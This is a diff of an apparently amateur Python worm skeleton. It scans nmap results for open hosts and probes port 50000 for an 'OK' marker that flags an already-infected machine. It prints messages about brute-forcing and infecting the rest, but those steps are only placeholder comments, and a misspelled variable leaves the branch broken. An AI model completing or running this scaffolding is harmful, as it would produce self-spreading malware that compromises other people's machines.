@@ -45,31 +45,39 @@ listedNmapString = list(filter(lambda x: "open" in x, nmapOutput.splitlines()))
 
 for entry in listedNmapString:
     ip = entry.split()[1]
-	
-host = ip
-dataDecoded = None
-errorOccured = False
+	host = ip
+	dataDecoded = None
+	errorOccured = False
 
-try:
-	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socketClient:
-		socketClient.connect((host, 50000))
-		socketClient.sendall('I'.encode('utf-8'))
-		data = socketClient.recv(1024)
-		dataDecoded = data.decode('utf-8')
-except:
-	errorOccured = True
+	try:
+		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socketClient:
+			socketClient.connect((host, 50000))
+			socketClient.sendall('I'.encode('utf-8'))
+			data = socketClient.recv(1024)
+			dataDecoded = data.decode('utf-8')
+	except:
+		errorOccured = True
 
-if not errorOccured:
-	if dataDecoded != 'OK':
-		print('ErrorOccured = false, dataDecoded =/= OK')
+	if not errorOccured:
+		if dataDecoded != 'OK':
+			print('ErrorOccured = false, dataDecoded =/= OK')
+			print('Found a possible computer to infect. Trying to bruteforce the machine...')			
+			#Try to bruteforce the machine here
+			bruteforced = False
+			if brutedforced:
+				print('Infecting the machine...')
+				#Infect the machine here
+		else:
+			print('ErreurOccured = false, dataDecoded = OK')
+			print('Machine already infected. Passing to the next one...')
+	else:
+		print('ErrorOccured = true')
 		print('Found a possible computer to infect. Trying to infect the machine...')
 		#Try to infect machine here
-	else:
-		print('ErreurOccured = false, dataDecoded = OK')
-		print('Machine already infected. Passing to the next one...')
-else:
-	print('ErrorOccured = true')
-	print('Unknown error occured. Retrying later...')
+		bruteforced = False
+		if brutedforced:
+			print('Infecting the machine...')
+			#Infect the machine here
 
 try:
 	onSenCaliss = input('Appuyez sur nimporte quel touche pour Quitter (DEBUGGING PURPOSES, A ENLEVER)')
